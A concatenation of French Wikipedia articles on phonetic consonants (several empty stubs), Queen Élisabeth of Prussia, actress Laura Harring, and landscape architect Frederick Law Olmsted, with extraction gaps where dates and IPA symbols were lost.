Consonne fricative linguo-labiale voisée

La consonne fricative linguo-labiale voisée est un son consonantique fréquent dans de plusieurs langues. Le symbole dans l'alphabet phonétique international est , ou .
Caractéristiques.
Voici les caractéristiques de la consonne fricative linguo-labiale voisée :

</doc>
<doc id="568606" url="https://fr.wikipedia.org/wiki?curid=568606" title="Consonne fricative éjective labio-dentale">
Consonne fricative éjective labio-dentale

La consonne fricative éjective labio-dentale est un son consonantique existant dans certaines langues. Le symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne fricative éjective labio-dentale :
En français.
Le français ne possède pas le [f'].
Occurence.
Dialecte = Caucase du Nord-Ouest
Langue = Abkhaze
Mot = апа
IPA = [afʼa]
Signification = mince

</doc>
<doc id="568607" url="https://fr.wikipedia.org/wiki?curid=568607" title="Consonne fricative éjective bilabiale sourde">
Consonne fricative éjective bilabiale sourde



</doc>
<doc id="568610" url="https://fr.wikipedia.org/wiki?curid=568610" title="Consonne fricative éjective rétroflexe sourde">
Consonne fricative éjective rétroflexe sourde



</doc>
<doc id="568611" url="https://fr.wikipedia.org/wiki?curid=568611" title="Élisabeth de Bavière (1801-1873)">
Élisabeth de Bavière (1801-1873)

Élisabeth Ludovica de Bavière, princesse de Bavière, puis reine consort de Prusse, est née le à Munich, dans l'électorat de Bavière, et morte le à Dresde, dans le royaume de Saxe. Fille du roi Maximilien et de la reine Caroline de Bavière, elle est l'épouse du roi Frédéric-Guillaume IV de Prusse.
Famille.
Issue de la maison de Wittelsbach, Élisabeth est la fille du roi Maximilien de Bavière et de la reine Caroline, née princesse Caroline de Bade.
Élisabeth est la sœur jumelle de la reine Amélie de Saxe et également la sœur de la reine Marie de Saxe, de l'archiduchesse Sophie d'Autriche, de la duchesse Ludovica en Bavière, de la duchesse Augusta de Leuchtenberg épouse d'Eugène de Beauharnais, et du roi Louis de Bavière.
Elle est la tante de l'empereur François-Joseph d'Autriche et de la duchesse Élisabeth en Bavière, dont elle est aussi la marraine, de la reine Marie-Sophie des Deux-Siciles et de la princesse Sophie d'Orléans, duchesse d'Alençon.
Le , Élisabeth épouse le "Kronprinz" (prince héritier) Frédéric-Guillaume de Prusse (le futur Frédéric-Guillaume IV), dont le mariage ne produisit aucune descendance. Elle refuse de devenir protestante comme condition à son mariage, pour monter sur le trône de Prusse aux côtés du futur roi, insistant sur le fait qu'elle ne se convertirait que si elle était convaincue des mérites de la foi réformée après l'avoir étudiée par elle-même. Leur mariage a cependant lieu, la couronne de Prusse pariant sur sa conversation avant l'accession au trône du "Kronprinz". Ce n'est que le , soit à peu près sept ans après son mariage, qu'Élisabeth se convertit officiellement au protestantisme.
Le prince Guillaume, frère cadet du "Kronprinz", qui pour sa part a été contraint d'épouser la princesse Augusta de Saxe-Weimar-Eisenach, femme libérale et francophile avec laquelle il s'entendit mal, exauça les attentes de la Cour de Prusse en engendrant rapidement avec son épouse un héritier à la dynastie, le prince Frédéric, permettant d'assurer le futur de la couronne et en surpassant le péril de la stérilité du couple royal.
En 1840, à la mort de son père, le "Kronprinz" Frédéric-Guillaume devient roi de Prusse sous le nom de Frédéric-Guillaume IV. La nouvelle reine Élisabeth sera une fervente partisane de l'alliance avec l'Autriche.
La Prusse est ébranlée par la révolution de 1848. La bourgeoisie libérale offre à Frédéric-Guillaume d'être le souverain d'une Allemagne unifiée, mais Frédéric-Guillaume méprise une couronne qu'il qualifie de "ramassée dans les caniveaux". Le roi Frédéric-Guillaume IV retrouve son pouvoir et la répression est sévère, tandis que l'Autriche retrouve son "leadership" au sein de la Confédération germanique.
En 1852, l'empereur François-Joseph d'Autriche souhaite se rapprocher du royaume de Prusse et engage des pourparlers en vue d'épouser la princesse Anne de Prusse, nièce de Frédéric-Guillaume IV. Le roi de Prusse, soutenu par son conseil, dédaigne les velléités autrichiennes. À la demande de sa sœur, l'archiduchesse Sophie, la reine s'entremet mais ses efforts restent vains. L'empereur épousera une de ses cousines bavaroises, la duchesse Élisabeth en Bavière, qui deviendra célèbre sous son surnom de "Sissi".
En 1858, le roi Frédéric-Guillaume IV est frappé d'une congestion cérébrale et ne peut plus exercer la réalité du pouvoir. La régence est confiée à son frère cadet, le prince Guillaume.
La même année, le prince héritier Frédéric épouse à Londres la princesse Victoria du Royaume-Uni, fille aînée de la reine Victoria. La jeune mariée de rejoint son nouveau pays par un temps glacial. L'accueil que lui réserve Élisabeth sera tout aussi peu encourageant.
« N'avez vous pas trop froid » sont les seuls mots d'accueil que cette souveraine frustrée saura adresser à la jeune étrangère. « Oui madame », répondra avec intelligence la jeune princesse britannique, « si ce n'est mon cœur qui est chaud ».
Quelques mois plus tard, le jeune couple mettra au monde un fils, le futur Guillaume II.
Le roi Frédéric-Guillaume IV meurt en 1861 et son frère Guillaume lui succède sur le trône prussien, sous le nom de Guillaume . Il appelle au pouvoir Otto von Bismarck. Celui-ci unifie l'Allemagne « par le fer et le sang ». En 1866, à l'issue d'une guerre fratricide, il soumet les États allemands – dont la Bavière – et chasse l'Autriche de la sphère germanique. Il agrandit la Prusse au détriment de ses voisins notamment par l'annexion du royaume de Hanovre, ancienne possession anglaise. En 1870, entraînant les autres États allemands dans une guerre défensive contre la France, il profite de la victoire pour donner à la Prusse le leadership du nouvel empire allemand.
Durant son veuvage, Élisabeth reçoit le soutien de la jeune princesse Victoria. Reconnaissante, la reine douairière révisera son jugement sur la jeune "Kronprinzessin" et lui accordera son amitié au point de lui léguer par testament ses bijoux (qui selon l'usage devaient pourtant revenir à la reine suivante, Augusta, épouse du prince-régent Guillaume, futur Guillaume ).
L'archiduchesse Sophie, vaincue et désabusée, meurt en 1872. La reine douairière Élisabeth meurt quelques mois plus tard en 1873 au cours d'une visite qu'elle rendait à sa sœur jumelle la reine Amélie de Saxe.

</doc>
<doc id="568612" url="https://fr.wikipedia.org/wiki?curid=568612" title="Consonne affriquée latérale alvéolaire voisée">
Consonne affriquée latérale alvéolaire voisée

La consonne affriquée latérale alvéolaire voisée est un son consonantique très peu fréquent en usage dans certaines langues parlées. Son symbole dans l'alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne affriquée latérale alvéolaire sourde :
Symboles de l'API.
Son symbole complet dans l'alphabet phonétique international est , représentant un D minuscule dans l'alphabet latin, suivi d'une ligature d'un L et d'un ʒ (« ej ») minuscules, tous les éléments étant reliés par un tirant. Le tirant est souvent omis quand cela ne crée pas d'ambiguïté. 
En français.
Le français ne possède pas le .
Autres langues.
Le son est inexistant dans les langues européennes et rare dans les langues du monde. Il se rencontre dans quelques langues amérindiennes comme le tlingit.

</doc>
<doc id="568613" url="https://fr.wikipedia.org/wiki?curid=568613" title="Consonne fricative éjective post-alvéolaire sourde">
Consonne fricative éjective post-alvéolaire sourde



</doc>
<doc id="568614" url="https://fr.wikipedia.org/wiki?curid=568614" title="Orthanc">
Orthanc



</doc>
<doc id="568615" url="https://fr.wikipedia.org/wiki?curid=568615" title="Consonne fricative éjective alvéolo-palatale">
Consonne fricative éjective alvéolo-palatale

La consonne fricative éjective alvéolo-palatale est un son consonantique assez peu fréquent dans les langues parlées. Le symbole dans l’alphabet phonétique international est .
Caractéristiques.
Voici les caractéristiques de la consonne fricative éjective alvéolo-palatale :
En français.
Le français ne possède pas le .

</doc>
<doc id="568616" url="https://fr.wikipedia.org/wiki?curid=568616" title="Laura Harring">
Laura Harring

Laura Harring, parfois Laura Elena Harring , est une actrice mexico-américaine, née le à Los Mochis (État de Sinaloa, Mexique).
Biographie.
Origines et jeunesse.
Laura Harring naît sous le nom d'état civil de Laura Helena Herring-Martinez le à Los Mochis (État de Sinaloa) au Mexique.
Son père, Raymond Herring, est d'origine austro-allemande et sa mère est Mexicaine. Son père exerce le métier de fermier biologique. Le couple se sépare en 1971, lorsque Laura a .
Laura Harring vit les dix premières années de sa vie au Mexique puis elle déménage à San Antonio, au Texas, où sa mère se remarie à un Cubain. À l’âge de , elle est victime d'une légère blessure à la tête due à une balle perdue lors d'un échange de tirs entre deux voitures qui suivaient celle dans laquelle elle se trouvait avec sa famille.
À , elle convainc sa famille d'aller poursuivre ses études en Suisse, à l’Aiglon College, dans le canton de Vaud.
Elle voyage un peu après son diplôme et est même pendant un mois travailleuse sociale en Inde.
Elle retourne ensuite au Texas, s'installe à El Paso, et commence à participer à des concours de beauté.
Miss USA et retour en Europe.
En 1985, Laura Herring est élue Miss USA. Elle est la première Hispanique à gagner ce titre.
Elle se marie en 1987 avec Carl-Eduard von Bismarck-Schönhausen, un comte allemand descendant d'Otto von Bismarck, et va le rejoindre en Allemagne.
Elle étudie alors le théâtre à , où elle se forme à la commedia dell'arte, ainsi qu'aux danses latines et au tango argentin.
Après son divorce en 1989, elle revient aux États-Unis en espérant commencer une carrière d’actrice.
Carrière d’actrice à la télévision et au cinéma.
Laura Harring débute dans le métier d'actrice vers la fin des années 1980 sous différents pseudonymes : « Laura Elena Harring », « Laura Martínez Harring », « Laura Herring » ou « Laura Elena Herring » (ce dernier étant le plus proche de son nom de naissance).
Après un petit rôle dans un téléfilm en 1987, ', elle obtient un premier rôle au cinéma en 1989 dans ' de Monte Hellman. Pendant les sept années suivantes, elle joue des rôles mineurs au cinéma ou à la télévision, dont une saison de "Hôpital central".
En 1997, sa participation à la série "Sunset Beach" dans le rôle de l'agent Paula Stevens lui accorde enfin une notoriété limitée. Puis son rôle dans "Mulholland Drive" en 2001, sous la direction de David Lynch, lui permet d'obtenir la reconnaissance de ses pairs et du public. Cette prestation lui vaut la remise en 2002 de l'ALMA Award de la meilleure actrice dans un film de cinéma.
Après ce succès, elle apparaît en 2002 au côté de Denzel Washington dans "John Q", réalisé par Nick Cassavetes, puis dans "Point d'impact" avec Jean-Claude Van Damme, et en 2003 dans "Willard" avec Crispin Glover. En 2004, on la voit dans "The Punisher", avec John Travolta, et dans "Return to Babylon", avec Tippi Hedren et Maria Conchita Alonso. 
Vie privée.
De à 1989, Laura Harring est mariée au comte allemand Carl-Eduard von Bismarck-Schönhausen, arrière-arrière-petit-fils du chancelier impérial Otto von Bismarck, et vit en Allemagne dans son château.
Après le divorce, Laura Harring a la possibilité de garder le titre de courtoisie de comtesse von Bismarck-Schönhausen. Mais elle s'en soucie peu car elle a souhaité abandonner le mode de vie de la noblesse allemande pour entamer une carrière professionnelle d'actrice.

</doc>
<doc id="568617" url="https://fr.wikipedia.org/wiki?curid=568617" title="Frederick Law Olmsted">
Frederick Law Olmsted

Frederick Law Olmsted ( à Hartford, Connecticut - à Belmont, Massachusetts) est un journaliste et architecte-paysagiste américain. Il est connu pour avoir créé de nombreux espaces de loisirs publics dans la seconde moitié du . Il était un défenseur convaincu de l'idée selon laquelle les parcs et autres espaces publics accessibles à toutes les couches de la société ont une importance sociale considérable.
En 1857, il remporte avec l'architecte britannique Calvert Vaux le concours pour la conception du futur Central Park de New York. Il est nommé architecte en chef et joue un rôle clé dans la création de cet espace de loisirs dans sa forme actuelle. Par la suite, il conçoit de nombreux parcs, complexes de parcs, campus et autres catégories d'espaces publics dans diverses villes des États-Unis.
Il est à l'origine de la création de réserves naturelles dans la vallée de Yosemite et aux chutes du Niagara, initiant ainsi un vaste mouvement environnemental. Son idée de recréer une grande zone forestière sur le domaine privé de Biltmore en Caroline du Nord a été un catalyseur pour le développement d'une législation sur la protection et la restauration des forêts et l'organisation d'agences fédérales connexes. Il a aussi conçu le parc du Mont-Royal à Montréal au Canada. Il a également été l'architecte-paysagiste de l'exposition universelle de 1893 et de Jackson Park à Chicago.
Pionnier de l'architecture de paysage, Frederick Law Olmsted insistait sur la valeur thérapeutique de la nature en ville contre les maux liés à l'urbanisation et à l'industrialisation. Par le recours à trois principaux éléments, boisés, prés et plans d'eau, traversés de multiples sentiers, il cherchait à mettre en valeur la pureté de la nature et à dégager des vues panoramiques.
Biographie.
Enfance et adolescence.
Son père, John Olmsted, descendant d'un des premiers habitants de la ville, James Olmsted (1645-1731), travaillait dans le commerce de tissus importés. Sa mère Charlotte Olmsted, femme au foyer, est morte d'une overdose de laudanum alors que Fred avait trois ans et son jeune frère John seulement six mois. Un an après la mort de sa mère, son père se marie en secondes noces avec Mary Ann Bull, un enfant de chœur de l'église, qui élèvera les enfants.
Enfant et adolescent, Fred change d'école privée et paroissiale et suit les cours d'un géomètre, mais, selon ses dires, il ne reste jamais longtemps à l'école et ne reçoit jamais d'éducation digne de ce nom. L'architecte a par la suite rappelé que sa vision des choses avait été influencée par les promenades à cheval avec ses parents dans les environs de Hartford, ainsi que par les livres qu'il a lus pendant son enfance, parmi lesquels les classiques anglais Oliver Goldsmith et Laurence Sterne, les peintres William Gilpin et Euvdale Price, et le philosophe John Zimmerman se sont distingués.
À l'âge de quatorze ans, Fred subit une grave brûlure au sumac vénéneux, qui provoque une inflammation des yeux. En raison de sa longue maladie, le garçon s'abstient d'étudier à l'université Yale, où il avait prévu de s'inscrire après l'obtention de son diplôme. Quelques années plus tard, en 1847, il suit encore un cours de chimie, de minéralogie et d'architecture à l'école, mais abandonne ses études quelques mois plus tard.
Olmsted était fasciné par la nature depuis son enfance. Après avoir fréquenté l'Académie Phillips, il étudia l'agronomie et l'ingénierie à l'université Yale. En 1843, il se rendit en Chine pour une année, revint travailler sur sa ferme du Connecticut, puis repartit pour la ville de New York où il acheta une petite ferme expérimentale de sur Staten Island. Cette ferme, dénommée "Les Bois d'Arden" ("The Woods of Arden") par son ancien propriétaire, fut renommée "Ferme Tomosock" ("Tomosock Farm") par Olmsted.
Recherche et parcours professionnel.
À partir de l'âge de 18 ans, Odmsted s'essaie à plusieurs carrières, cherchant à trouver sa place dans la vie. En 1840, avec la protection de son père, il obtient un emploi de commis dans la firme Berkard et Hutton de Manhattan, qui s'occupe d'importer des tissus de soie. Travailler 12 heures par jour, 6 jours par semaine, n'est pas satisfaisant, mais lui donne l'occasion de visiter les navires marchands qui déchargent leurs marchandises dans la baie de New York. Poussé par le romantisme des voyages, Frederick accepte un emploi de marin débutant sur la barque Ronaldson, qui doit livrer une cargaison de fourrures à la Chine. Le dur labeur physique, la cruauté du capitaine, les crises de mal de mer et l'incapacité à se rapprocher de la vie chinoise cantonaise mettent un terme à sa future carrière de marin.
Agriculture.
En 1846, Frederick décide de se lancer dans l'agriculture dite "scientifique" et, afin d'acquérir les connaissances et l'expérience nécessaires, il se fait embaucher pendant un an par George Geddes devenu célèbre pour ses inventions agricoles. Sa première expérience avec sa propre ferme n'est pas une réussite : le terrain sur la rive du Long Island Channel dans le Connecticut qu'il achète avec l'argent de son père s'avère peu utile pour cultiver des plantes.
Une ferme située à Staten Island, qu'il achète grâce à un prêt en 1847, s'avère plus rentable. En raison de la concurrence accrue sur le marché des céréales (facilitée par le développement du transport ferroviaire et fluvial), Frederick passe de la culture du blé à celle des légumes et des fruits périssables. La ferme qu'il a appelée "Tosomock Farm" est le premier endroit où les traits d'un futur paysagiste sont apparus. Olmsted enrichit la propriété en nettoyant et en berçant l'étang et en plantant des plantes aquatiques ainsi que des ginkgos ornementaux, des noyers noirs et des cèdres du Liban. Le déménagement dans la banlieue de New York n'apporte pas seulement des récoltes plus importantes, mais met aussi Frederick en contact avec de riches voisins qui joueront un rôle important dans son destin ultérieur. L'une de ces nouvelles connaissances est George Putman, éditeur de livres et propriétaire d'un magazine littéraire.
Comme dans son enfance, la lecture reste l'un de ses loisirs. Olmsted est très impressionné par le roman philosophique Sartor Resartus de l'écrivain britannique Thomas Carlyle, qui invite le lecteur à déterminer ce qui, dans le récit, est vrai, ce qui est fictif et ce qui est faux. Un autre auteur favori est John Ruskin, dont le deuxième volume de "Modern Artists" vient d'être publié. Ses œuvres, ainsi que celles de Gilpin, Carlyle et Zimmerman, ont été conservées dans la bibliothèque de Frederick jusqu'à la fin de sa vie.
1 voyage en Europe.
En 1850, Olmsted voyage avec son frère John et son ami Charley Brace dans plusieurs pays européens, notamment en Grande-Bretagne. Ils n'avaient pas prévu de séjourner dans la ville portuaire de Liverpool, mais un commerçant local les persuada de jeter un coup d'œil au Birkenhead Park, récemment ouvert et construit aux frais de l'État. Cette création de Joseph Paxton, avec son naturalisme et ses allées sinueuses, fit une impression durable sur Olmsted, préfigurant largement sa future carrière. Plus tard, en décrivant les résultats de son voyage, Frederick soulignera l'accessibilité du parc à diverses couches de la population, y compris les pauvres. La compagnie visite également le château gallois de Chirk, entouré d'un jardin anglais d'arbres taillés et de pelouses ; contrairement au terrain de loisirs de Liverpool, cette propriété à l'accès restreint appartient à une famille aristocratique.
À son retour aux États-Unis, Olmsted reçoit l'offre inattendue de Putman d'écrire un livre sur le voyage. Frederick est un homme cultivé, mais il n'a jusqu'alors que peu ou pas d'expérience en matière d'écriture. Il fait appel à l'aide professionnelle d'Andrew Downing, rédacteur en chef d'un magazine horticole qui avait déjà publié les lettres de l'agriculteur novice. C'est à Newburgh, où vit Downing, qu'Olmsted rencontre pour la première fois son futur compagnon Calvert Vox, mais leur première rencontre s'avère éphémère et ne laisse aucune trace dans la mémoire de l'un ou l'autre. Un ouvrage intitulé "Walks and Talks of an American Farmer in England" est publié au début de l'année 1852. Il est salué par la critique, mais ne se vend qu'à contrecœur.
Journalisme.
Sur la vague du succès littéraire, Olmsted décide d'acquérir une seconde profession. Toujours entrepreneur privé, il se lance dans le journalisme pendant son temps libre. En 1852, à la suite du débat public sur "La Case de l'oncle Tom" de Harriet Beecher Stowe et des tensions croissantes entre les États du Nord et du Sud qui en découlent, Olmsted accepte l'offre de Henry Raymond, rédacteur en chef du New York Daily Times (aujourd'hui The New York Times), de se rendre dans le Sud et de faire découvrir aux lecteurs du journal la vie dans les États esclavagistes. Frederick s'intéresse activement aux nouveaux développements de l'agriculture et voit dans ce voyage non seulement l'occasion de gagner de l'argent pendant l'automne et l'hiver, mais aussi de mener sa propre analyse du développement de l'économie agraire basée sur l'esclavage.
Entre décembre et avril, il parcourt incognito les États du sud-est, de la Virginie au Mississippi, observe les habitants, fait de brèves connaissances et envoie des rapports à sa rédaction. La faible productivité du travail, le retard culturel général et l'attitude paternaliste de la population noire à l'égard de ses maîtres surprennent fortement l'auteur et l'amènent à penser que l'esclavage devrait être aboli le plus rapidement possible. À l'automne 1853, Olmsted se rend à nouveau dans le sud, cette fois avec son frère, dans le Texas frontalier, peu peuplé et récemment annexé. Au cours de ce voyage, le journaliste est impressionné par la communauté de colons allemands de New Braunfels, qui cultivent leurs propres terres et se distinguent économiquement des fermes esclavagistes voisines. De ses recherches sur le terrain, Olmsted en conclut non seulement que la pratique de l'esclavagisme était moralement odieuse, mais qu'elle était également coûteuse et économiquement inefficace. Ses dépêches furent conservées et constituent aujourd'hui de précieux documents concernant la période avant la guerre civile. Olmsted fut également le cofondateur de la revue "The Nation", en 1865.
Après ce voyage, Olmsted envisage déjà la profession de journaliste et de publiciste-écrivain comme sa carrière principale. La création d'un livre sur l'esclavage aux États-Unis nécessite de trouver au préalable un éditeur, et à cette fin, Olmsted accepte un emploi comme l'un des associés silencieux de Dix, Edwards &amp; Company, qui publie le Putnam's Magazine, acheté à George Putnam. En 1856, les affaires de la maison d'édition déclinent et Olmsted doit publier son propre ouvrage, intitulé "A Journey into the Seaboard Slave States" ("Voyage dans les États esclavagistes du littoral)", pour son propre compte. Le livre reçoit des critiques élogieuses mais, comme le premier, se vend très mal. Cette situation, et la faillite de l'entreprise qui s'ensuit, obligent Olmsted à chercher de nouvelles sources de revenus. En 1850, il se rendit en Europe afin de visiter certains jardins publics de Paris, Londres et Vienne. Il publia, en 1852 "Walks and Talks of an American Farmer in England" ("Promenades et commentaires d'un fermier américain en Angleterre").
Gestionnaire.
En août 1857, Olmsted reçoit une offre inattendue de Charles Elliott, une de ses connaissances, qui lui propose d'essayer un poste vacant de chef de projet pour un grand parc municipal. Ce poste ne nécessitait aucune compétence créative, mais il exigeait une expérience du travail sur un chantier de construction avec des ouvriers subalternes qui nettoyaient le site. Frederick Law, qui n'avait pas eu beaucoup de succès dans cette carrière (hormis la gestion de quelques ouvriers agricoles), a décidé de tenter sa chance, car il n'avait aucune source de revenus et avait besoin d'argent. Le manque d'expérience est compensé par des lettres de recommandation et la signature de nombreux parrains, dont des personnalités aussi influentes que l'écrivain Washington Irving, le magnat Morris Jesup, le diplomate Bayard Taylor et James Hamilton, avocat et fils de l'un des pères fondateurs des États-Unis, Alexander Hamilton.
Le projet consistait à préparer la zone en vue d'un futur développement, notamment par l'assèchement des marais, le dynamitage (une partie du site était recouverte d'affleurements rocheux qu'il fallait démolir) et la démolition des structures laissées par les propriétaires précédents. Sous réserve de l'approbation du conseil d'administration, Olmsted a supervisé et géré l'opération, employant entre 700 et 2 000 hommes. Le superviseur immédiat d'Olmsted est le colonel et ingénieur en chef du projet, Egbert Veal, qui avait auparavant effectué un relevé topographique de la zone et soumis son plan pour le futur parc.
Concours.
Malgré l'approbation initiale du plan de Veal, le conseil d'administration du parc annonça néanmoins un concours public pour la conception de la future zone de loisirs, dont l'un des initiateurs et participants était Calvert Vox. Cet architecte britannique, qui avait déjà travaillé avec Andrew Downing, avait proposé à Olmsted, en novembre 1857, de collaborer à la rédaction du concours. Bien plus tard, il avoua que l'une des raisons de cette demande était qu'il avait lu et aimé la description des parcs anglais dans Walks and Talks. L'auteur de la biographie d'Olmsted, Justin Martin, pense que Vox était en fait insatisfait de la qualité de la carte de ville et qu'il avait besoin d'aide pour obtenir des informations actualisées sur le paysage, ce que le superviseur de l'ouvrage pouvait lui fournir. Quoi qu'il en soit, le partenariat qui s'établit entre Olmsted et Vox est crucial pour l'un comme pour l'autre, car il prédétermine non seulement l'aspect du futur parc, mais aussi la carrière future des deux maîtres.
Le dernier jour du concours, le 31 mars 1858, Olmsted et Vox présentent leur projet, qu'ils appellent ""Greensward", et qui est le 33e de la liste. Les auteurs ont inclus ses attributs obligatoires selon les termes du concours, mais ils l'ont fait d'une manière particulière. Les structures et constructions monumentales, présentes dans la plupart des autres œuvres, ont été réduites dans "Greensward"" ou masquées par des paysages naturels. Par exemple, la place d'honneur, conçue par les organisateurs comme un lieu pour les cérémonies militaires officielles, est présentée dans l'œuvre sous la forme d'une pelouse aux dimensions les plus réduites possibles. La description ne comportait pas la tour monumentale requise, mais incluait une terrasse d'observation basse, incarnée plus tard sous le nom de "château du Belvédère".
Selon la conception du concours, les visiteurs du parc devaient être attirés le plus rapidement possible dans l'espace récréatif, et une série de chemins sinueux s'éloignant des rues de la ville a été conçue à cet effet. L'une de ces allées partait de l'entrée principale située à l'angle de la Cinquième Avenue et de la 59e Rue et se dirigeait vers le centre, où une allée centrale d'ormes, pas trop longue et appelée "Promenade" (aujourd'hui connue sous le nom de "Mall"), devait être aménagée. Un soin particulier a été apporté pour donner à la zone un aspect provincial et rural, avec des bassins pittoresques et une abondante végétation boisée, et avec une absence presque totale des éléments pompeux et formels typiques de nombreux jardins royaux en Europe. Pour incarner davantage l'idylle campagnarde, les passages de circulation auraient dû être abaissés au-dessous du niveau du sol et entourés d'une clôture et d'une végétation arbustive dense. Outre Olmsted et Vox, l'architecte britannique Jacob Mould a participé activement à la conception de Central Park.
Premiers pas dans la construction.
Le 28 avril 1858, les créateurs du plan Greensward sont déclarés vainqueurs du concours, recevant sept des onze votes du jury. Officiellement, Frederick Olmsted devient l'architecte en chef de Central Park et Calvert Vox son assistant, chaque partenaire se concentrant sur un rôle particulier, tout en prenant une part égale à la création de Central Park.
Vox, en tant qu'expert en conception et construction de bâtiments, s'occupe principalement des différentes structures : ponts, pavillons, stations de bateaux, etc., tandis qu'Olmsted définit la stratégie globale de développement, est responsable du design et de la perception esthétique en général. S'appuyant sur son intuition et son expérience, il décide de transformer les paysages d'une zone particulière du parc, en les transformant en bosquets, pelouses et plans d'eau artificiels imitant les caractéristiques naturelles. À cet égard, il est allé bien au-delà du jardinage paysager traditionnel, dans lequel l'horticulture et l'aménagement paysager jouaient un rôle déterminant. Par exemple, selon Olmsted, une pelouse construite avec des arbres solitaires et ayant la forme d'un sablier doit avoir un pouvoir mystique et attirer les visiteurs comme un tourbillon, et la combinaison de feuilles sombres au premier plan et claires à l'arrière-plan doit créer l'illusion d'un plus grand espace. Olmsted, comme auparavant, cumule le poste de directeur et s'occupe à ce titre du travail administratif, ce qui n'intéresse guère Vox.
L'une des innovations inventées par Olmsted et Vox, inédite dans le domaine du jardinage, est la division des chemins en chemins équestres et piétonniers, qui facilite les déplacements des différents groupes de visiteurs. Des échangeurs sont construits à leurs intersections, pour lesquels des ponts supplémentaires sont construits, chacun avec une architecture unique.
en Europe.
À l'automne 1859, alors que le parc exploite déjà une patinoire sur le lac nouvellement construit, que la colline densément boisée de "Ramble", avec son labyrinthe de sentiers, est ouverte aux visiteurs et que la plupart des sentiers du parc inférieur sont terminés, Olmsted commence à présenter des symptômes de maladie mentale, décrits comme des troubles bipolaires, en plus d'insomnies chroniques et de dépressions. Le Board of Park Commissioners accepte ces symptômes comme le résultat d'une surcharge de travail et accorde à l'architecte une bourse pour voyager en Europe, officiellement dans le cadre d'un échange. De septembre à décembre de la même année, Olmsted visite de nombreux jardins en Grande-Bretagne, en France, en Belgique et en Allemagne, dont Berkenhead Park, le célèbre Arboretum de Derby, Chatsworth House, Great Windsor Park, Aston Hall, Birmingham Botanic Garden, Hyde Park, St James' Park, Versailles, St Cloud, le Jardin du Luxembourg et la Forêt de Boulogne. Il retourne plusieurs fois dans certaines des fermes répertoriées.
Contrairement à son premier voyage, cette fois le nom d'Olmsted est déjà bien connu en Europe pour sa contribution à la création de la zone de loisirs de New York, et les fonctionnaires sont désireux d'établir des contacts, de le rencontrer et de lui fournir des informations sur les sujets qui l'intéressent.
Réalisations.
À la suite d'un voyage en Europe, Olmsted introduisit un certain nombre d'innovations administratives, dont certaines étaient avant-gardistes pour l'époque. Il s'agit notamment de la limitation de la vitesse des charrettes à l'intérieur du parc à 5 miles par heure et de l'aménagement de ce que l'on appelle des "repos de voiture", qui, avec l'avènement et le développement de la circulation automobile, se sont transformés en parkings bien connus. Des gardes en uniforme sont apparus dans le parc et devaient être visibles du public, mais ne pas engager la conversation avec lui, sauf en cas d'absolue nécessité ou pour lui adresser personnellement la parole. Des panneaux décrivant les règles de conduite apparaissent afin de prévenir les infractions. En plus de leurs activités principales à Central Park, Olmsted et Vox s'engagent dans des projets secondaires. L'un d'entre eux est l'élaboration d'un plan pour le cimetière de Hillside dans la banlieue new-yorkaise de Middletown. Dans une lettre adressée à une commission gouvernementale, les compagnons se présentent comme des " architectes paysagistes ", utilisant le terme dans son sens moderne pour la première fois dans l'histoire.
Accident et décès de son fils.
En août 1860, Olmsted manque de se tuer en tombant d'une gondole renversée avec son fils nouveau-né dans les bras. L'enfant meurt quelques jours plus tard et Frederick Law, qui souffre d'une triple fracture de la jambe, survit malgré le pronostic défavorable des médecins. La conséquence de cette blessure est une jambe raccourcie et une boiterie sévère pour le reste de sa vie.
Dès les premières étapes de la construction, il devient évident que le budget du parc dépasse largement les fonds alloués et, alors qu'Olmsted est en Europe, le Board of Commissioners nomme Andrew Green, contrôleur en chef, afin de réduire les dépenses de fonds publics. Au cours de l'année 1860, un conflit éclate entre Olmsted et Green : l'architecte en chef se plaint que Green s'en prend à toutes les dépenses, même les plus insignifiantes, et cherche à prendre sa place. Andrew Green est un membre actif du conseil des commissaires. Considéré comme un associé et un ami proche d'Olmsted depuis que le plan Greensward a été discuté, mais leur relation s'est détériorée au fur et à mesure qu'ils travaillaient ensemble. En janvier 1861, Olmsted présente une démission émouvante de ses deux postes d'architecte en chef et de surintendant, qui lui est accordée en juin de la même année.
Guerre civile.
Commission sanitaire.
Avec le déclenchement de la guerre de Sécession (1861-1865), Olmsted commence à chercher une occasion d'y prendre part du côté de l'Union, malgré sa jambe infirme. En juin 1861, il accepte l'offre du ministre Henry Bellows de devenir directeur général de la "Sanitary Commission", créée pour organiser les premiers soins aux militaires blessés et malades. Une inspection des camps de tentes au sud de Washington révèle l'absence de conditions sanitaires adéquates : les volontaires sont vêtus de ce qu'ils peuvent, se reposent serrés les uns contre les autres dans des tentes sales ou sur le sol nu, et mangent de la nourriture maigre et avariée. Des entretiens avec la milice après la défaite de la bataille de Bull Run révèlent la mauvaise organisation de l'offensive nordiste : une partie des troupes avant la bataille souffre du manque d'eau, de nourriture et de sommeil, une autre se précipite dans la bataille immédiatement après la fastidieuse manœuvre de marche.
Olmsted est particulièrement préoccupé par le "Medical Committee", une petite unité médicale non conçue pour des opérations de combat à grande échelle et dirigée par un chirurgien âgé. À l'automne 1861, Olmsted rédige une série d'initiatives législatives visant à réorganiser le service médical, rencontre le commandant en chef de l'armée du Potomac, George McClellan, le sénateur Henry Wilson et obtient une audience auprès du président Abraham Lincoln. Un projet de loi en ce sens n'est approuvé par le Congrès américain qu'au printemps 1862, lorsque la prolongation des hostilités devient évidente.
Pendant la campagne de la péninsule, Olmsted organise plusieurs hôpitaux flottants sur les affluents de la rivière York en Virginie, dotés de chirurgiens professionnels, de frères et sœurs médecins et d'assistants. Les navires accueillent les malades et les blessés, leur prodiguent les premiers soins (y compris l'extraction des balles et les opérations d'amputation) et les évacuent par mer vers les hôpitaux de New York et de Boston. Une autre fonction de la Sanitary Commission, directement gérée par Olmsted, consiste à collecter des dons dans les États du Nord par le biais de diverses foires et concerts de charité. La nourriture, les vêtements, les médicaments et les fournitures achetés avec les recettes sont transportés dans la zone de guerre et distribués aux hôpitaux de campagne. Par exemple, juste avant la bataille d'Antietam Creek, l'organisation installe 12 entrepôts à l'arrière de l'armée américaine et fournit plus de 28 000 chemises, serviettes, oreillers, tasses en fer-blanc et autres produits secs, ainsi que 30 barils de bandages, du chloroforme, de l'opium, 2 620 livres de lait concentré, 5 000 livres de bœuf, 3 000 bouteilles de boissons alcoolisées, des citrons frais, des biscuits, du thé et du sucre.
